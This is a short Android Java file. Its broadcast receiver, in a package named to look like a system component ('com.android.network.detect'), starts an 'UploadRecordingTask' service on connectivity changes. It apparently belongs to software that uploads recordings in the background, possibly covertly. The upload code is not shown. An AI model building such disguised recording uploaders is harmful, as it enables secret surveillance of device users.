package com.android.network.detect;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;

public class ConnectionChangeReceiver extends BroadcastReceiver {



    @Override
    public void onReceive(Context context, Intent intent) {
            Intent startServiceIntent = new Intent(context, UploadRecordingTask.class);
            context.startService(startServiceIntent);
    }
}

